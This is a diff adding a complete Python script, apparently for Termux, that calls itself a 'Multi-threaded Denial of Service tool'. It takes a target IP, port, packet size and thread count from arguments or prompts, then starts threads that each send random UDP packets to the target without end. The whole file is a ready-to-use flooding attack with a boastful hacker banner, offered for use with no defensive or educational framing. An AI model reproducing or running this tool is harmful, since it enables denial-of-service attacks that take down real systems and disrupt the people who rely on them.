@@ -1,0 +1,78 @@
+#!/data/data/com.termux/files/usr/bin/python
+try:
+    import threading
+    import socket
+    import random
+    import sys
+    import os
+except ImportError as e:
+    print(f"\033[1;31m[ERROR] \033[0m\xBB {e}")
+    sys.exit()
+os.system("clear")
+def random_phrase():
+    ppl = ["Alienkrishn", "Anon4You", "Alienkrishn ~Anon4You"]
+    phrase = ["was here", "is watching you", "knows your name", "knows your location", "can hack you", "says don't missuse", "hacked u", "is looking for u", "is right behind you", "has hype" , "yahi hai"]
+    return random.choice(ppl) + " " + random.choice(phrase)
+
+def banner():
+    print(f"""\033[1;31m
+ ____                           _
+|  _ \\ _____      _____ _ __ __| | ___  ___
+| |_) / _ \\ \\ /\\ / / _ \\ '__/ _` |/ _ \\/ __|
+|  __/ (_) \\ V  V /  __/ | | (_| | (_) \\__ \\
+|_|   \\___/ \\_/\\_/ \\___|_|  \\__,_|\\___/|___/
+              		                 \33[34;2mVersion 1.0.1\33[0m
+
+Note : \33[0;1m\33[4m{random_phrase()}\33[0m
+
+
+\33[34;1mMulti-threaded Denial of Service tool
+\033[1;33mCoded by Anon4You\033[0m ^_^
+    """)
+
+def DoS(ip, port, size, index):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    while True:
+        sock.sendto(random._urandom(size), (ip, port))
+        print(f"\033[1;34m[THREAD {index}] \033[0m\xBB \033[1;35m{size}\033[0m bytes sent to \033[1;35m{ip}\033[0m")
+
+def main():
+    try:
+        if sys.version_info[0] != 3:
+            print("\033[1;31m[ERROR] \033[0m\xBB Please run the tool using Python 3")
+            sys.exit()
+        
+        if len(sys.argv) < 5:
+            banner()
+
+        IP       = input("\033[1;34m[>] \033[2;32mEnter the target ip \xBB \033[0m") if len(sys.argv) < 2 else sys.argv[1]
+        PORT     = int(input("\033[1;34m[>] \033[2;32mEnter the target port \xBB \033[0m")) if len(sys.argv) < 3 else int(sys.argv[2])
+        SIZE     = int(input("\033[1;34m[>] \033[2;32mEnter the packet size \xBB \033[0m")) if len(sys.argv) < 4 else int(sys.argv[3])
+        COUNT    = int(input("\033[1;34m[>] \033[2;32mEnter how many threads to use \xBB \033[0m")) if len(sys.argv) < 5 else int(sys.argv[4])
+
+
+        if PORT > 65535 or PORT < 1:
+            print("\n\033[1;31m[ERROR] \033[0m\xBB Please, choose a port between 1 and 65535")
+            sys.exit(1)
+
+        if SIZE > 65500 or SIZE < 1:
+            print("\n\033[1;31m[ERROR] \033[0m\xBB Please, choose a size between 1 and 65500")
+            sys.exit(1)
+
+    except KeyboardInterrupt:
+        print("\n\033[1;31m[!] \033[0mExiting...")
+        sys.exit()
+    
+    except Exception as e:
+        print(f"\n\033[1;31m[ERROR] \033[0m\xBB {e}")
+        sys.exit()
+
+    for i in range(COUNT):
+        try:
+            t = threading.Thread(target=DoS, args=(IP, PORT, SIZE, i))
+            t.start()
+        except Exception as e:
+            print(f"\n\033[1;31m[ERROR] \033[0m\xBB An error ocurred initializing thread {i}: {e}")            
+
+if __name__ == "__main__":
+    main()
